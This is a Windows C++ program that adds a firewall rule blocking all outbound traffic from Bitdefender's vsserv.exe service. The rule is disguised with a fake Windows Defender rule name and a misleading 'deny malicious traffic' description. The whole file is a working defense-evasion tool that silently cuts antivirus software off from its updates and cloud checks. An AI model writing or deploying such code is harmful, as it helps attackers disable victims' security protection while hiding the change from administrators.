#include <windows.h>
#include <stdio.h>
#include <netfw.h>

#pragma comment( lib, "ole32.lib" )
#pragma comment( lib, "oleaut32.lib" )


int main(int argc, char ** argv) {
    HRESULT hrComInit = S_OK;
    HRESULT hr = S_OK;

    // Initialize COM library
    hrComInit = CoInitializeEx(
                    0,
                    COINIT_APARTMENTTHREADED
                    );
					
    if (FAILED(hrComInit)) {
        printf("CoInitializeEx failed: 0x%08lx\n", hrComInit);
        goto Cleanup;        
    }

	// load NetFwPolicy2 COM
    INetFwPolicy2 * pNetFwPolicy2 = NULL;	
    hr = CoCreateInstance(__uuidof(NetFwPolicy2), 
						NULL, 
						CLSCTX_INPROC_SERVER, 
						__uuidof(INetFwPolicy2), 
						(LPVOID *) &pNetFwPolicy2);

    if (FAILED(hr)) {
        printf("CoCreateInstance for INetFwPolicy2 failed: 0x%08lx\n", hr);
        goto Cleanup;        
    }

    // Retrieve FW rules
    INetFwRules * pFwRules = NULL;
    hr = pNetFwPolicy2->get_Rules(&pFwRules);
    if (FAILED(hr)) {
        printf("get_Rules failed: 0x%08lx\n", hr);
        goto Cleanup;
    }

    // Create a new Firewall Rule object.
	INetFwRule * pFwRule = NULL;
    hr = CoCreateInstance(
                __uuidof(NetFwRule),
                NULL,
                CLSCTX_INPROC_SERVER,
                __uuidof(INetFwRule),
                (void**)&pFwRule);
				
    if (FAILED(hr)) {
        printf("CoCreateInstance for Firewall Rule failed: 0x%08lx\n", hr);
        goto Cleanup;
    }

	// new FW rule settings
    BSTR bstrRuleName = SysAllocString(L"Windows Defender Firewall Remote Management (RPC)");
    BSTR bstrRuleGroup = SysAllocString(L"Windows Defender Firewall Remote Management (RPC)");
    BSTR bstrRuleDescription = SysAllocString(L"Deny malicious outbound network traffic");
    BSTR bstrRuleApplication = SysAllocString(L"C:\\Program Files\\Bitdefender Antivirus Free\\vsserv.exe");
	BSTR bstrRuleRAddrs = SysAllocString(L"54.0.0.0/8");

	long CurrentProfilesBitMask = NET_FW_PROFILE2_DOMAIN  | NET_FW_PROFILE2_PRIVATE | NET_FW_PROFILE2_PUBLIC;

    // Populate the Firewall Rule object
    pFwRule->put_Name(bstrRuleName);
    pFwRule->put_Description(bstrRuleDescription);
    pFwRule->put_ApplicationName(bstrRuleApplication);
    pFwRule->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
	//pFwRule->put_RemoteAddresses(bstrRuleRAddrs);
    pFwRule->put_Direction(NET_FW_RULE_DIR_OUT);
    pFwRule->put_Grouping(bstrRuleGroup);
    pFwRule->put_Profiles(CurrentProfilesBitMask);
	pFwRule->put_Action(NET_FW_ACTION_BLOCK);
    pFwRule->put_Enabled(VARIANT_TRUE);

    // Add the Firewall Rule
    hr = pFwRules->Add(pFwRule);
    if (FAILED(hr)) {
        printf("Firewall Rule Add failed: 0x%08lx\n", hr);
        goto Cleanup;
    }

Cleanup:
    // Free BSTR's
    SysFreeString(bstrRuleName);
    SysFreeString(bstrRuleDescription);
    SysFreeString(bstrRuleGroup);
    SysFreeString(bstrRuleApplication);
    SysFreeString(bstrRuleRAddrs);

    // Release the INetFwRule object
    if (pFwRule != NULL) {
        pFwRule->Release();
    }

    // Release the INetFwRules object
    if (pFwRules != NULL) {
        pFwRules->Release();
    }

    // Release the INetFwPolicy2 object
    if (pNetFwPolicy2 != NULL) {
        pNetFwPolicy2->Release();
    }

    // Uninitialize COM.
    if (SUCCEEDED(hrComInit)) {
        CoUninitialize();
    }
   
    return 0;
}

